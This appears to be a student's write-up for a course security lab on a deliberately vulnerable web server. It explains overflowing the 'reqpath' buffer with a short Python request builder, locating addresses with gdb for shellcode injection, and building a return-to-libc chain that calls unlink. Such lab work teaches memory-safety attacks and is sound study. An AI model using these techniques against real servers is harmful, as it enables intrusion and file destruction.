# Lab 1

## Part 1: Finding buffer overflows

There is one buffer overflow we can find in the `http.c`, the `reqpath`
can be overflowed.

So I write a brute-force python script:

```py
def build_exploit(shellcode):
    junk_data = b"22"
    req = b"GET " + b"/1" + junk_data * 2060 + b" HTTP/1.0\r\n\r\n"
    return req
```

## Part 2: Code injection

Instead of using brute-force ways, we should calculate carefully how many bytes
we need to inject. It is still easy.

First, we should use `gdb` to hack the web system.

```sh
b process_client
c
x/16x reqpath
info frame
```

+ `reqpath` start address is at `0x7fffffffdca0`
+ `process_client` functions return address is at `0x7fffffffecb8`

Now, it is obvious. We should set the return address to be `0x7fffffffecc0`
which is just behind the return address, and the shell code should be put in
the `0x7fffffffecc0`

## Part 3

Still we need to use `reqpath` overflow. So the idea is that first we need to
make `process_client` returns to `accidentally` function and when `accidentally` return,the next instruction should call `unlink`.

Let's look at what does `accidentally` does:

```c
void accidentally(void)
{
       __asm__("mov 16(%%rbp), %%rdi": : :"rdi");
}
```

Well, we need to change `rbp`'s value. So we could make the following
memory layout:

+ `0x7fffffffecb8`: the `accidentally` start address
+ `0x7fffffffecc0`: the `unlink` start address
+ `0x7fffffffecc8`: the parameter start address `0x7fffffffecd0`.
+ `0x7fffffffecd0`: the parameter

At last, we need to provide the start address of the parameter.

Now we can code.

## Part 4

Well, It is easy to fix. I omit this part.
